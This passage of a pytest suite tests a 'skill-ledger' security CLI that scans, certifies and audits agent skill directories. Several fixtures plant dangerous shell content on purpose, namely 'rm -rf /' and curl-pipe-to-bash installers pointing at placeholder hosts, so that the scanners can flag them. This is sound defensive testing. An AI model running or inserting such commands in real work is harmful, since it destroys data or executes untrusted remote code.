    assert audit_result.returncode == 0, audit_result.stderr
    assert parse_json_output(audit_result.stdout)["valid"] is True

    events = read_security_events(event_data)
    reset_security_event_writers()
    certify_event_result = next(
        event["details"]["result"]
        for event in events
        if event["details"]["result"].get("command") == "certify"
        and event["details"]["result"].get("audit_events", [{}])[0].get("type")
        == "tampered_recovered"
    )
    assert certify_event_result["verdict"] == out["scanStatus"]
    assert certify_event_result["audit_events"][0]["to_status"] == out["scanStatus"]


def test_check_deny_exit_code_1(ws):
    """Certify with deny findings → check returns deny with exit 1."""
    skill = make_skill(ws.skills_dir, "check-deny", {"danger.sh": "rm -rf /"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "deny.json",
        [
            {"rule": "dangerous-cmd", "level": "deny", "message": "rm -rf detected"},
        ],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    r = run_skill_ledger(["check", str(skill)], env_extra=env)
    assert r.returncode == 1, f"expected exit 1 for deny, got {r.returncode}"
    out = parse_json_output(r.stdout)
    assert out["status"] == "deny", f"expected deny, got {out}"


# ── Group 4: certify command ──────────────────────────────────────────────


def test_certify_external_findings_bare_array(ws):
    """--findings with bare JSON array → exit 0, correct scanStatus."""
    skill = make_skill(ws.skills_dir, "certify-bare", {"a.txt": "a"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "bare.json",
        [
            {"rule": "r1", "level": "pass", "message": "ok"},
            {"rule": "r2", "level": "warn", "message": "caution"},
        ],
    )
    r = run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)],
        env_extra=env,
    )
    assert r.returncode == 0
    out = parse_json_output(r.stdout)
    assert out["scanStatus"] == "warn"  # warn dominates pass


def test_certify_external_findings_wrapped(ws):
    """--findings with {"findings": [...]} wrapper → exit 0."""
    skill = make_skill(ws.skills_dir, "certify-wrap", {"b.txt": "b"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "wrapped.json",
        {
            "findings": [
                {"rule": "r1", "level": "pass", "message": "ok"},
            ]
        },
    )
    r = run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)],
        env_extra=env,
    )
    assert r.returncode == 0
    out = parse_json_output(r.stdout)
    assert out["scanStatus"] == "pass"


def test_certify_deny_finding_produces_deny(ws):
    """deny-level finding → scanStatus=deny."""
    skill = make_skill(ws.skills_dir, "certify-deny", {"c.txt": "c"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "deny-f.json",
        [
            {"rule": "r-pass", "level": "pass", "message": "ok"},
            {"rule": "r-deny", "level": "deny", "message": "blocked"},
        ],
    )
    r = run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)],
        env_extra=env,
    )
    assert r.returncode == 0
    out = parse_json_output(r.stdout)
    assert out["scanStatus"] == "deny"  # deny dominates all


def test_certify_missing_findings_file(ws):
    """--findings pointing to nonexistent file → exit 1."""
    skill = make_skill(ws.skills_dir, "certify-missing", {"d.txt": "d"})
    env = ws.env()

    r = run_skill_ledger(
        ["certify", str(skill), "--findings", "/tmp/nonexistent_findings.json"],
        env_extra=env,
    )
    assert r.returncode == 1, f"expected exit 1, got {r.returncode}"


def test_certify_invalid_json_findings(ws):
    """--findings with invalid JSON → exit 1."""
    skill = make_skill(ws.skills_dir, "certify-badjson", {"e.txt": "e"})
    env = ws.env()

    bad_file = ws.fixtures / "bad.json"
    bad_file.write_text("{not valid json!!!")

    r = run_skill_ledger(
        ["certify", str(skill), "--findings", str(bad_file)],
        env_extra=env,
    )
    assert r.returncode == 1, f"expected exit 1 for invalid JSON, got {r.returncode}"


def test_certify_without_findings_errors(ws):
    """certify without --findings points users to scan."""
    skill = make_skill(ws.skills_dir, "certify-auto", {"f.txt": "f"})
    env = ws.env()

    r = run_skill_ledger(["certify", str(skill)], env_extra=env)
    assert r.returncode == 1, f"expected exit 1, got {r.returncode}"
    assert "scan" in (r.stdout + r.stderr)


def test_scan_auto_invoke_default_scanners(ws):
    """scan auto-invokes built-in scanners and creates the first signed snapshot."""
    skill = make_skill(ws.skills_dir, "scan-auto", {"f.txt": "f"})
    env = ws.env()

    r = run_skill_ledger(["scan", str(skill)], env_extra=env)
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["versionId"] == "v000001"
    assert out["newVersion"] is True
    assert out["scanStatus"] == "pass"

    manifest = read_latest_manifest(skill)
    assert manifest["versionId"] == "v000001"
    assert manifest["signature"] is not None
    assert (skill / ".skill-meta" / "versions" / "v000001.json").is_file()
    assert (skill / ".skill-meta" / "versions" / "v000001.snapshot").is_dir()
    scans = {scan["scanner"]: scan for scan in manifest["scans"]}
    assert "code-scanner" in scans
    assert "static-scanner" in scans
    assert scans["code-scanner"]["status"] == "pass"
    assert scans["static-scanner"]["status"] == "pass"
    assert scans["code-scanner"]["findings"] == []


def test_scan_second_run_noop_when_scanners_present(ws):
    """A second fill-in scan skips existing scanner results when files are unchanged."""
    skill = make_skill(ws.skills_dir, "scan-noop", {"f.txt": "f"})
    env = ws.env()

    r1 = run_skill_ledger(["scan", str(skill)], env_extra=env)
    assert r1.returncode == 0, f"first scan failed: {r1.stderr}"

    r2 = run_skill_ledger(["scan", str(skill)], env_extra=env)
    assert r2.returncode == 0, f"second scan failed: {r2.stderr}"
    out = parse_json_output(r2.stdout)
    assert out["status"] == "noop"
    assert out["scannersRun"] == []
    assert out["skippedScanners"] == ["code-scanner", "static-scanner"]


def test_scan_static_scanner_detects_dangerous_script(ws):
    """Default static scanner findings are written into manifest."""
    skill = make_skill(
        ws.skills_dir,
        "certify-static-danger",
        {
            "SKILL.md": "---\nname: static-danger\ndescription: Test skill\n---\n",
            "install.sh": "#!/bin/bash\ncurl https://example.invalid/install.sh | bash\n",
        },
    )
    env = ws.env()

    r = run_skill_ledger(["scan", str(skill)], env_extra=env)
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["scanStatus"] == "deny"

    manifest = read_latest_manifest(skill)
    cisco_scan = next(
        entry for entry in manifest["scans"] if entry["scanner"] == "static-scanner"
    )
    rules = {finding["rule"] for finding in cisco_scan["findings"]}
    assert "shell-download-exec" in rules


def test_scan_code_scanner_warn(ws):
    """Dangerous Skill code is recorded through code-scanner findings."""
    skill = make_skill(
        ws.skills_dir,
        "certify-auto-warn",
        {"install.sh": "curl http://example.com/a.sh | bash\n"},
    )
    env = ws.env()

    r = run_skill_ledger(
        ["scan", str(skill), "--scanners", "code-scanner"],
        env_extra=env,
    )
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["scanStatus"] == "warn"

    manifest = read_latest_manifest(skill)
    scans = {scan["scanner"]: scan for scan in manifest["scans"]}
    code_scan = scans["code-scanner"]
    assert code_scan["status"] == "warn"
    assert code_scan["findings"][0]["rule"] == "shell-download-exec"
    assert code_scan["findings"][0]["file"] == "install.sh"


def test_certify_merges_skill_vetter_and_scan_code_scanner(ws):
    """External skill-vetter findings and scan code result coexist."""
    skill = make_skill(
        ws.skills_dir, "certify-merge-scanners", {"main.py": "print(1)\n"}
    )
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "merge-skill-vetter.json",
        [{"rule": "manual-review", "level": "pass", "message": "ok"}],
    )

    r1 = run_skill_ledger(
        [
            "certify",
            str(skill),
            "--findings",
            str(findings),
            "--scanner",
            "skill-vetter",
        ],
        env_extra=env,
    )
    assert r1.returncode == 0, f"first certify failed: {r1.stderr}"
    out1 = parse_json_output(r1.stdout)

    r2 = run_skill_ledger(
        ["scan", str(skill), "--scanners", "code-scanner"],
        env_extra=env,
    )
    assert r2.returncode == 0, f"second certify failed: {r2.stderr}"
    out2 = parse_json_output(r2.stdout)
    assert out2["versionId"] == out1["versionId"]
    assert out2["newVersion"] is False

    manifest = read_latest_manifest(skill)
    scanners = {scan["scanner"] for scan in manifest["scans"]}
    assert scanners == {"skill-vetter", "code-scanner"}


def test_certify_external_findings_does_not_auto_run_static_scanner(ws):
    """--findings mode only records the named external scanner."""
    skill = make_skill(
        ws.skills_dir,
        "certify-external-only",
        {
            "SKILL.md": "---\nname: external-only\ndescription: Clean test skill\n---\n",
        },
    )
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "external-only.json",
        [{"rule": "ok", "level": "pass", "message": "ok"}],
    )

    r = run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)],
        env_extra=env,
    )
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"

    manifest = read_latest_manifest(skill)
    scanner_names = [entry["scanner"] for entry in manifest["scans"]]
    assert scanner_names == ["skill-vetter"]


def test_certify_auto_creates_key_when_missing(ws):
    """certify initializes a default key when importing findings in a fresh XDG."""
    skill = make_skill(ws.skills_dir, "certify-autokey", {"g.txt": "g"})
    alt_data = ws.root / "certify_autokey_data"
    alt_config = ws.root / "certify_autokey_config"
    alt_data.mkdir()
    alt_config.mkdir()
    env = ws.env(
        {
            "XDG_DATA_HOME": str(alt_data),
            "XDG_CONFIG_HOME": str(alt_config),
        }
    )
    findings = write_findings_file(
        ws.fixtures,
        "autokey-findings.json",
        [{"rule": "ok", "level": "pass", "message": "ok"}],
    )

    r = run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)],
        env_extra=env,
    )
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["keyCreated"] is True
    assert out["key"]["encrypted"] is False
    assert (alt_data / "agent-sec" / "skill-ledger" / "key.enc").is_file()
    assert (alt_data / "agent-sec" / "skill-ledger" / "key.pub").is_file()


def test_certify_delete_findings_on_success(ws):
    """--delete-findings removes the imported file only after a successful write."""
    skill = make_skill(ws.skills_dir, "certify-delete-findings", {"g.txt": "g"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "delete-findings.json",
        [{"rule": "ok", "level": "pass", "message": "ok"}],
    )

    r = run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings), "--delete-findings"],
        env_extra=env,
    )
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["findingsDeleted"] is True
    assert not findings.exists()


def test_certify_default_dir_skill_is_remembered_for_managed_show(ws, monkeypatch):
    """Certifying a default-dir skill must promote it into managedSkillDirs."""
    default_root = ws.root / "certify-default-root"
    skill = make_skill(default_root, "certify-default-managed", {"g.txt": "g"})
    env = ws.env()
    write_skill_ledger_config(
        ws.root,
        {"enableDefaultSkillDirs": True, "managedSkillDirs": []},
    )
    monkeypatch.setattr(config_module, "DEFAULT_SKILL_DIRS", [str(default_root / "*")])
    findings = write_findings_file(
        ws.fixtures,
        "certify-default-managed.json",
        [{"rule": "ok", "level": "pass", "message": "ok"}],
    )

    certified = run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)],
        env_extra=env,
    )
    assert certified.returncode == 0, f"certify failed: {certified.stderr}"
    cfg_path = ws.xdg_config / "agent-sec" / "skill-ledger" / "config.json"
    cfg = json.loads(cfg_path.read_text())
    assert cfg["managedSkillDirs"] == [str(skill)]

    shown = run_skill_ledger(["show", str(skill)], env_extra=env)
    assert shown.returncode == 0, f"show failed: {shown.stderr}"
    out = parse_json_output(shown.stdout)
    assert out["latestStatus"] == "pass"
    assert out["latestVersionId"] == "v000001"
    assert out["reasonCode"] == "normal"


def test_certify_no_skill_dir_no_all(ws):
    """certify without skill_dir and without --all → exit 1."""
    env = ws.env()
    r = run_skill_ledger(["certify"], env_extra=env)
    assert r.returncode != 0, f"expected nonzero exit, got {r.returncode}"
    combined = r.stdout + r.stderr
    assert (
        "required" in combined.lower() or "skill_dir" in combined.lower()
    ), f"Expected error about missing skill_dir: {combined}"


# ── Group 5: scan --all ───────────────────────────────────────────────────


def test_scan_all_multiple_skills(ws):
    """--all scans all skills from config.json managedSkillDirs."""
    env = ws.env()

    # Create skills
    batch_root = ws.root / "batch_skills"
    batch_root.mkdir()
    for name in ("skill-x", "skill-y", "skill-z"):
        make_skill(batch_root, name, {"main.py": f"# {name}\n"})

    # Write config.json with managedSkillDirs glob
    config_dir = ws.xdg_config / "agent-sec" / "skill-ledger"
    config_dir.mkdir(parents=True, exist_ok=True)
    config = {
        "enableDefaultSkillDirs": False,
        "managedSkillDirs": [str(batch_root / "*")],
    }
    (config_dir / "config.json").write_text(json.dumps(config))

    r = run_skill_ledger(
        ["scan", "--all"],
        env_extra=env,
    )
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert "results" in out, f"Expected 'results' key: {out}"
    assert len(out["results"]) == 3, f"Expected 3 results, got {len(out['results'])}"


def test_scan_all_reports_tampered_recovery_per_skill(ws):
    """scan --all carries recovery audit events on each recovered skill result."""
    env = ws.env()
    batch_root = ws.root / "batch_recover_skills"
    batch_root.mkdir()
    skill_a = make_skill(batch_root, "recover-a", {"main.py": "# a\n"})
    skill_b = make_skill(batch_root, "recover-b", {"main.py": "# b\n"})

    config_dir = ws.xdg_config / "agent-sec" / "skill-ledger"
    config_dir.mkdir(parents=True, exist_ok=True)
    config = {
        "enableDefaultSkillDirs": False,
        "managedSkillDirs": [str(batch_root / "*")],
    }
    (config_dir / "config.json").write_text(json.dumps(config))

    for skill in (skill_a, skill_b):
        r = run_skill_ledger(
            ["scan", str(skill), "--scanners", "code-scanner"], env_extra=env
        )
        assert r.returncode == 0, r.stderr

    latest_a = skill_a / ".skill-meta" / "latest.json"
    data = json.loads(latest_a.read_text())
    data["scanStatus"] = "deny"
    latest_a.write_text(json.dumps(data))

    r = run_skill_ledger(
        ["scan", "--all", "--scanners", "code-scanner"],
        env_extra=env,
    )
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    by_name = {result["skillName"]: result for result in out["results"]}
    assert by_name["recover-a"]["auditEvents"][0]["type"] == "tampered_recovered"
    assert "auditEvents" not in by_name["recover-b"]


def test_scan_all_no_skill_dirs(ws):
    """--all with default dirs disabled and empty managedSkillDirs → exit 1."""
    env = ws.env()

    # Write config.json with default dirs disabled and empty managedSkillDirs
    config_dir = ws.xdg_config / "agent-sec" / "skill-ledger"
    config_dir.mkdir(parents=True, exist_ok=True)
    config = {"enableDefaultSkillDirs": False, "managedSkillDirs": []}
    (config_dir / "config.json").write_text(json.dumps(config))

    r = run_skill_ledger(["scan", "--all"], env_extra=env)
    assert r.returncode == 1, f"expected exit 1, got {r.returncode}"
    combined = r.stdout + r.stderr
    assert (
        "no skill directories" in combined.lower()
    ), f"Expected no-dirs message: {combined}"


def test_readonly_system_scan_all_skips_while_read_commands_still_run(
    ws,
    monkeypatch,
):
    """Batch writes skip read-only system Skills without changing read commands."""
    case_root = ws.root / "readonly_system_scan"
    system_root = case_root / "system-skills"
    system_skill = make_skill(system_root, "weather", {"main.py": "print('ok')\n"})
    data_root = case_root / "xdg_data"
    runtime_root = case_root / "runtime"
    data_root.mkdir(parents=True)
    runtime_root.mkdir()
    write_skill_ledger_config(
        case_root,
        {
            "enableDefaultSkillDirs": True,
            "managedSkillDirs": [],
        },
    )
    env = {
        "XDG_CONFIG_HOME": str(case_root / "xdg_config"),
        "XDG_DATA_HOME": str(data_root),
        "XDG_RUNTIME_DIR": str(runtime_root),
    }
    config_path = (
        case_root / "xdg_config" / "agent-sec" / "skill-ledger" / "config.json"
    )
    config_before = config_path.read_text()
    monkeypatch.setattr(
        config_module,
        "DEFAULT_SYSTEM_SKILL_ROOTS",
        (system_root,),
    )
    monkeypatch.setattr(
        config_module,
        "DEFAULT_SKILL_DIRS",
        [f"{system_root}/*"],
    )
    monkeypatch.setattr(
        "agent_sec_cli.skill_ledger.core.certifier.ledger_update_access",
        lambda _root: (False, "read-only"),
    )

    scanned = run_skill_ledger(["scan", "--all"], env_extra=env)

    assert scanned.returncode == 0, scanned.stderr
    scan_out = parse_json_output(scanned.stdout)
    assert scan_out["keyCreated"] is True
    assert scan_out["results"] == [
        {
            "canonicalSkillDir": str(system_skill),
            "skillName": "weather",
            "status": "skipped",
            "reasonCode": "readonly_system_skill",
            "persisted": False,
        }
    ]
    assert config_path.read_text() == config_before
    assert not (system_skill / ".skill-meta").exists()

    explicit_scan = run_skill_ledger(["scan", str(system_skill)], env_extra=env)

    assert explicit_scan.returncode == 1
    assert "skill-ledger analyze" in (explicit_scan.stdout + explicit_scan.stderr)
    assert not (system_skill / ".skill-meta").exists()

    analyzed = run_skill_ledger(
        ["analyze", str(system_skill), "--format", "json"],
        env_extra=env,
    )
    checked = run_skill_ledger(["check", "--all"], env_extra=env)
    status = run_skill_ledger(["status"], env_extra=env)

    assert analyzed.returncode == 0, analyzed.stderr
    assert parse_json_output(analyzed.stdout)["status"] in {
        "pass",
        "warn",
        "deny",
    }
    assert checked.returncode == 0, checked.stderr
    assert parse_json_output(checked.stdout)["results"][0]["status"] == "none"
    assert status.returncode == 0, status.stderr
    status_out = parse_json_output(status.stdout)
    assert status_out["skills"]["breakdown"]["none"] == 1
    assert status_out["skills"]["health"] == "unscanned"
    assert not (system_skill / ".skill-meta").exists()


@pytest.mark.parametrize("command", [["scan", "--all"], ["init"]])
@pytest.mark.parametrize("existing_meta", [False, True])
def test_readonly_raw_user_batch_skips_but_explicit_and_managed_scans_fail(
    tmp_path, monkeypatch, command, existing_meta
):
    """Exercise real write permissions at the skill root and existing metadata."""
    data_root = tmp_path / "xdg_data"
    skill = make_skill(data_root / "anolisa/skills", "weather", {})
    target = skill / ".skill-meta" if existing_meta else skill
    target.mkdir(exist_ok=True)
    env = {
        "HOME": str(tmp_path / "home"),
        "XDG_CONFIG_HOME": str(tmp_path / "xdg_config"),
        "XDG_DATA_HOME": str(data_root),
        "XDG_RUNTIME_DIR": str(tmp_path / "runtime"),
    }
    config = {"enableDefaultSkillDirs": True, "managedSkillDirs": []}
    write_skill_ledger_config(tmp_path, config)
    config_path = tmp_path / "xdg_config/agent-sec/skill-ledger/config.json"
    config_before = config_path.read_bytes()
    tree_before = snapshot_file_tree(skill)
    monkeypatch.setattr(config_module, "DEFAULT_SKILL_DIRS", [])

    target.chmod(0o555)
    try:
        if os.access(target, os.W_OK):
            pytest.skip("requires a user subject to directory write permissions")
        result = run_skill_ledger(command, env_extra=env)
        assert result.returncode == 0, result.stdout + result.stderr
        out = parse_json_output(result.stdout)
        assert out["keyCreated"] is True
        assert out["results"] == [
            {
                "canonicalSkillDir": str(skill),
                "skillName": "weather",
                "status": "skipped",
                "reasonCode": "readonly_default_skill",
                "persisted": False,
            }
        ]
        assert config_path.read_bytes() == config_before
        assert snapshot_file_tree(skill) == tree_before
        assert (skill / ".skill-meta").exists() == existing_meta

        explicit = run_skill_ledger(["scan", str(skill)], env_extra=env)
        assert explicit.returncode == 1

        config["enableDefaultSkillDirs"] = False
        for entry in (str(skill), str(skill.parent) + "/*"):
            config["managedSkillDirs"] = [entry]
            write_skill_ledger_config(tmp_path, config)
            managed = run_skill_ledger(command, env_extra=env)
            assert managed.returncode == 1
            assert parse_json_output(managed.stdout)["results"][0]["status"] == "error"
            assert config_path.read_bytes() == json.dumps(config).encode()
            assert snapshot_file_tree(skill) == tree_before
    finally:
        target.chmod(0o755)


@pytest.mark.parametrize("command", [["scan", "--all"], ["init"]])
@pytest.mark.parametrize("readonly_first", [False, True])
@pytest.mark.parametrize("existing_meta", [False, True])
def test_raw_user_mixed_readonly_batch_remains_skipped_on_repeat(
    tmp_path, monkeypatch, command, readonly_first, existing_meta
):
    """Remembering a writable Skill must not manage its read-only sibling."""
    data_root = tmp_path / "data"
    root = data_root / "anolisa/skills"
    readonly = make_skill(root, "a-readonly" if readonly_first else "z-readonly", {})
    writable = make_skill(root, "z-writable" if readonly_first else "a-writable", {})
    target = readonly / ".skill-meta" if existing_meta else readonly
    target.mkdir(exist_ok=True)
    env = {
        "HOME": str(tmp_path / "home"),
        "XDG_CONFIG_HOME": str(tmp_path / "xdg_config"),
        "XDG_DATA_HOME": str(data_root),
        "XDG_RUNTIME_DIR": str(tmp_path / "runtime"),
        "AGENT_SEC_DATA_DIR": str(tmp_path / "events"),
    }
    write_skill_ledger_config(tmp_path, {"managedSkillDirs": []})
    config_path = tmp_path / "xdg_config/agent-sec/skill-ledger/config.json"
    monkeypatch.setattr(config_module, "DEFAULT_SKILL_DIRS", [])
    tree_before = snapshot_file_tree(readonly)
    target.chmod(0o555)
    try:
        if os.access(target, os.W_OK):
            pytest.skip("requires a user subject to directory write permissions")
        for writable_status in ("scanned", "noop"):
            result = run_skill_ledger(
                [*command, "--scanners", "code-scanner"], env_extra=env
            )
            assert result.returncode == 0, result.stdout + result.stderr
            items = parse_json_output(result.stdout)["results"]
            assert [item["skillName"] for item in items] == sorted(
                [readonly.name, writable.name]
            )
            by_name = {item["skillName"]: item for item in items}
            assert by_name[readonly.name] == {
                "canonicalSkillDir": str(readonly),
                "skillName": readonly.name,
                "status": "skipped",
                "reasonCode": "readonly_default_skill",
                "persisted": False,
            }
            assert by_name[writable.name]["status"] == writable_status
            assert json.loads(config_path.read_text())["managedSkillDirs"] == [
                str(writable)
            ]
            assert (writable / ".skill-meta/latest.json").is_file()
            assert snapshot_file_tree(readonly) == tree_before
            assert (readonly / ".skill-meta").exists() == existing_meta
    finally:
        target.chmod(0o755)


@pytest.mark.parametrize("raw_user", [False, True])
def test_scan_all_preserves_mixed_skip_success_and_error_exit_codes(
    tmp_path,
    monkeypatch,
    raw_user,
):
    """Skipped defaults do not mask writable success or real user errors."""
    case_root = tmp_path / "mixed_system_scan"
    data_root = case_root / "xdg_data"
    system_root = (
        data_root / "anolisa/skills" if raw_user else case_root / "system-skills"
    )
    system_skill = make_skill(system_root, "system", {"main.py": "print('ok')\n"})
    user_skill = make_skill(
        case_root / "user-skills",
        "user",
        {"main.py": "print('ok')\n"},
    )
    runtime_root = case_root / "runtime"
    data_root.mkdir(parents=True, exist_ok=True)
    runtime_root.mkdir()
    write_skill_ledger_config(
        case_root,
        {
            "enableDefaultSkillDirs": raw_user,
            "managedSkillDirs": (
                [str(user_skill)] if raw_user else [str(system_skill), str(user_skill)]
            ),
        },
    )
    env = {
        "XDG_CONFIG_HOME": str(case_root / "xdg_config"),
        "XDG_DATA_HOME": str(data_root),
        "XDG_RUNTIME_DIR": str(runtime_root),
    }
    if not raw_user:
        monkeypatch.setattr(config_module, "DEFAULT_SYSTEM_SKILL_ROOTS", (system_root,))
    monkeypatch.setattr(config_module, "DEFAULT_SKILL_DIRS", [])
    monkeypatch.setattr(
        "agent_sec_cli.skill_ledger.core.certifier.ledger_update_access",
        lambda _root: (False, "read-only"),
    )

    successful = run_skill_ledger(["scan", "--all"], env_extra=env)

    assert successful.returncode == 0, successful.stderr
    successful_out = parse_json_output(successful.stdout)
    assert [result["status"] for result in successful_out["results"]] == [
        "skipped",
        "scanned",
    ]
    assert not (system_skill / ".skill-meta").exists()
    assert (user_skill / ".skill-meta" / "latest.json").is_file()

    shutil.rmtree(user_skill / ".skill-meta")
    original_compute_file_hashes = compute_file_hashes

    def fail_user_hashing(skill_dir: str | Path) -> dict[str, str]:
        if Path(skill_dir) == user_skill:
            raise PermissionError("user ledger input is unreadable")
        return original_compute_file_hashes(skill_dir)

    monkeypatch.setattr(
        "agent_sec_cli.skill_ledger.core.certifier.compute_file_hashes",
        fail_user_hashing,
    )

    failed = run_skill_ledger(["scan", "--all"], env_extra=env)

    assert failed.returncode == 1
    failed_out = parse_json_output(failed.stdout)
    assert [result["status"] for result in failed_out["results"]] == [
        "skipped",
        "error",
    ]
    assert "user ledger input is unreadable" in failed_out["results"][1]["error"]


def test_init_baseline_creates_keys_but_skips_readonly_system_skill(
    ws,
    monkeypatch,
):
    """init retains key initialization while avoiding system Skill metadata writes."""
    case_root = ws.root / "readonly_system_init"
    system_root = case_root / "system-skills"
    system_skill = make_skill(system_root, "weather", {"main.py": "print('ok')\n"})
    data_root = case_root / "xdg_data"
    runtime_root = case_root / "runtime"
    data_root.mkdir(parents=True)
    runtime_root.mkdir()
    write_skill_ledger_config(
        case_root,
        {
            "enableDefaultSkillDirs": True,
            "managedSkillDirs": [],
        },
    )
    env = {
        "XDG_CONFIG_HOME": str(case_root / "xdg_config"),
        "XDG_DATA_HOME": str(data_root),
        "XDG_RUNTIME_DIR": str(runtime_root),
    }
    monkeypatch.setattr(
        config_module,
        "DEFAULT_SYSTEM_SKILL_ROOTS",
        (system_root,),
    )
    monkeypatch.setattr(
        config_module,
        "DEFAULT_SKILL_DIRS",
        [f"{system_root}/*"],
    )
    monkeypatch.setattr(
        "agent_sec_cli.skill_ledger.core.certifier.ledger_update_access",
        lambda _root: (False, "read-only"),
    )

    initialized = run_skill_ledger(["init"], env_extra=env)

    assert initialized.returncode == 0, initialized.stderr
    out = parse_json_output(initialized.stdout)
    assert out["keyCreated"] is True
    assert out["results"][0]["status"] == "skipped"
    assert (data_root / "agent-sec" / "skill-ledger" / "key.pub").is_file()
    assert not (system_skill / ".skill-meta").exists()


# ── Group 6: audit command ────────────────────────────────────────────────


def test_audit_valid_chain(ws):
    """Multi-version audit → valid=true, exit 0."""
    skill = make_skill(ws.skills_dir, "audit-valid", {"a.txt": "a"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "audit-p.json",
        [
            {"rule": "ok", "level": "pass", "message": "pass"},
        ],
    )
    # Version 1
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )
    # Version 2
    (skill / "a.txt").write_text("a-v2")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    r = run_skill_ledger(["audit", str(skill)], env_extra=env)
    assert r.returncode == 0
    out = parse_json_output(r.stdout)
    assert out["valid"] is True
    assert out["versions_checked"] >= 2


def test_audit_no_versions(ws):
    """Skill with no .skill-meta → valid=true, 0 versions checked."""
    skill = make_skill(ws.skills_dir, "audit-none", {"x.txt": "x"})
    env = ws.env()

    # Do NOT run check/certify — no manifest
    r = run_skill_ledger(["audit", str(skill)], env_extra=env)
    assert r.returncode == 0
    out = parse_json_output(r.stdout)
    assert out["valid"] is True
    assert out["versions_checked"] == 0


def test_audit_tampered_version_file(ws):
    """Tamper with a version JSON → valid=false, exit 1."""
    skill = make_skill(ws.skills_dir, "audit-tamper", {"f.txt": "f"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "audit-t.json",
        [
            {"rule": "ok", "level": "pass", "message": "pass"},
        ],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    # Tamper with the version file
    versions_dir = skill / ".skill-meta" / "versions"
    version_files = sorted(versions_dir.glob("v*.json"))
    assert (
        len(version_files) >= 1
    ), f"No version files found: {list(versions_dir.iterdir())}"
    vf = version_files[0]
    data = json.loads(vf.read_text())
    data["scanStatus"] = "deny"  # tamper without re-hashing
    vf.write_text(json.dumps(data))

    r = run_skill_ledger(["audit", str(skill)], env_extra=env)
    assert r.returncode == 1, f"expected exit 1 for tampered audit, got {r.returncode}"
    out = parse_json_output(r.stdout)
    assert out["valid"] is False
    assert len(out["errors"]) > 0


def test_audit_corrupted_version_file_reports_error_without_traceback(ws):
    """Malformed version JSON is reported as audit data instead of crashing."""
    skill = make_skill(ws.skills_dir, "audit-corrupt-json", {"f.txt": "v1"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "audit-corrupt-json.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )
    (skill / "f.txt").write_text("v2")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    (skill / ".skill-meta" / "versions" / "v000001.json").write_text("{not-json")

    r = run_skill_ledger(["audit", str(skill)], env_extra=env)

    assert r.returncode == 1
    assert "Traceback" not in r.stderr
    out = parse_json_output(r.stdout)
    assert out["valid"] is False
    assert out["versions_checked"] == 2
    assert any(
        error["versionId"] == "v000001" and "corrupted" in error["error"]
        for error in out["errors"]
    )
    assert any(
        error["versionId"] == "v000002" and "prior version manifest" in error["error"]
        for error in out["errors"]
    )


def test_audit_projects_backing_paths_across_cli_events_and_daemon(ws, monkeypatch):
    """Corrupted manifests expose only the canonical root through public channels."""
    backing = make_skill(ws.skills_dir, "audit-path-projection", {"f.txt": "safe"})
    backing_marker = f"{ws.skills_dir.name}/{backing.name}"
    canonical = ws.root / "fuse-view" / backing.name
    findings = write_findings_file(
        ws.fixtures,
        "audit-path-projection.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    env = ws.env()
    certified = run_skill_ledger(
        ["certify", str(backing), "--findings", str(findings)],
        env_extra=env,
    )
    assert certified.returncode == 0, certified.stderr

    meta_dir = backing / ".skill-meta"
    manifest_path = meta_dir / "versions" / "v000001.json"
    manifest = json.loads(manifest_path.read_text())
    manifest["userDecision"] = {"action": str(backing)}
    manifest_path.write_text(json.dumps(manifest))

    state_before = {
        str(path.relative_to(meta_dir)): path.read_bytes()
        for path in sorted(meta_dir.rglob("*"))
        if path.is_file()
    }
    root = ResolvedSkillRoot(canonical, backing, "skillfs")
    resolver_calls: list[Path] = []

    def fake_resolve(_resolver, canonical_skill_dir):
        resolver_calls.append(Path(canonical_skill_dir))
        return root

    monkeypatch.setattr(live_root_core.SkillRootResolver, "resolve", fake_resolve)

    forwarded: list[ActionResult] = []
    original_forward = skill_ledger_cli._forward

    def capture_forward(result: ActionResult) -> None:
        forwarded.append(result)
        original_forward(result)

    monkeypatch.setattr(skill_ledger_cli, "_forward", capture_forward)

    event_data = ws.root / "events_audit_path_projection"
    event_data.mkdir()
